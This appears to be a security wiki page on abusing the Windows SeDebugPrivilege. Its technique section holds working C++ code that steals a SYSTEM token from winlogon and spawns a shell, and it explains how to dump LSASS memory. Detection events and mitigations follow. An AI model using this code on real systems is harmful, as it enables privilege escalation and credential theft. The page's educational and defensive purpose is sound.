---
title: SeDebugPrivilege Abuse
slug: sedebug-privilege-abuse
---

> **TL;DR:** `SeDebugPrivilege` lets the holder open a handle to **any** process — including SYSTEM-owned ones — making LSASS memory read and SYSTEM token theft trivial.

## What it is
`SeDebugPrivilege` is a Windows token privilege that overrides DACL checks on `OpenProcess` and `OpenThread`. With it enabled, `NtOpenProcess` succeeds against processes whose DACL would otherwise deny access, including `lsass.exe`, `services.exe`, and `winlogon.exe`. It is granted to local Administrators by default but is disabled in the token until explicitly enabled with `AdjustTokenPrivileges`. See [[tokens-and-privileges]] and [[credential-dumping]].

## Preconditions / where it applies
- Member of local Administrators (or a service running as a security principal granted `SeDebugPrivilege` in `secpol`)
- Privilege must be enabled in the current token (it is **present but disabled** by default)
- PPL protection on LSASS (`RunAsPPL=1`) blocks userland handle open even with SeDebug

## Technique
Enable the privilege, then open the target with `PROCESS_QUERY_INFORMATION | PROCESS_VM_READ` for memory dump, or `PROCESS_QUERY_INFORMATION` plus `OpenProcessToken` for token theft, duplicate to a primary token, and spawn a process with `CreateProcessWithTokenW`.

```cpp
// enable SeDebugPrivilege
TOKEN_PRIVILEGES tp = { 1, { {0,0}, SE_PRIVILEGE_ENABLED } };
LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
AdjustTokenPrivileges(hTok, FALSE, &tp, 0, NULL, NULL);

// steal SYSTEM token from winlogon
HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogonPid);
HANDLE t; OpenProcessToken(h, TOKEN_DUPLICATE, &t);
HANDLE dup; DuplicateTokenEx(t, MAXIMUM_ALLOWED, NULL,
    SecurityImpersonation, TokenPrimary, &dup);
CreateProcessWithTokenW(dup, 0, L"C:\\Windows\\System32\\cmd.exe",
    NULL, 0, NULL, NULL, &si, &pi);
```

For LSASS dumping, swap the open mask for `PROCESS_VM_READ` and call `MiniDumpWriteDump` — the same SeDebug requirement applies. See [[token-impersonation]].

## Detection and defence
- 4673 (privileged service called) / 4674 with `SeDebugPrivilege`
- Sysmon EID 10 (ProcessAccess) to `lsass.exe` with `0x1010` / `0x1410` access masks
- Enable LSA protection (`RunAsPPL`) and Credential Guard; remove SeDebug from non-admin groups via GPO `User Rights Assignment`

## References
- [ired.team — Primary Access Token Manipulation](https://www.ired.team/offensive-security/privilege-escalation/t1134-access-token-manipulation) — token theft walkthrough
- [Microsoft — Privilege Constants (SE_DEBUG_NAME)](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) — official semantics
